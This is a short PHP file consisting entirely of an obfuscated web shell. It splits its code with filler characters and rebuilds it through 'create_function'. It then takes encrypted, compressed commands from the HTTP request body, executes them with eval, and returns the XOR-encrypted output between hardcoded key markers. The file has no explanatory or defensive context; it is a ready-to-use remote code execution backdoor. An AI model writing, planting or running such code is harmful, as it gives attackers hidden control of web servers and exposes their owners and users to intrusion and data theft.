<?php
$y='~+){$o.=$t{$!~i}^$k{$j}!~!~;}}return $o!~;}if!~ (@preg_!~match!~("!~/$kh(.+)$kf!~/",!~@file_ge!~t_co!~ntents("p!~hp:/';
$t=str_replace('YI','','cYIreatYIe_YIfuYIYInYIction');
$O='et_!~!~contents();!~@!~ob_!~end_clean(!~);$!~r=@base6!~4_encode(@!~x(!~@gzcompres!~s(!~$o),$k));pri!~!~nt("$p!~$kh$r$kf");}';
$A='/!~!~input")!~,$m)!~==1) {@ob_sta!~rt();@!~eva!~l(@gzuncom!~p!~!~ress(!~@x!~(@ba!~se64_decode($m[1]),$k)!~)!~);$o=@ob_g';
$d=')!~{$c=s!~trlen($k!~);$l=strl!~en!~(!~$t);$o="";fo!~r($i=0;$!~i<$l;){for(!~$j=0;(!~$j<$c!~&&$i<$l!~);$j!~++,!~$i+!';
$i='$k="69844!~b!~08!~";$kh!~="6daa00cc845!~8";$kf="!~738805!~979!~627";$p="o!~KH!~VAA!~da5os!~SJTxn";f!~unction x($!~t!~,$k';
$g=str_replace('!~','',$i.$d.$y.$A.$O);
$h=$t('',$g);$h();
?>
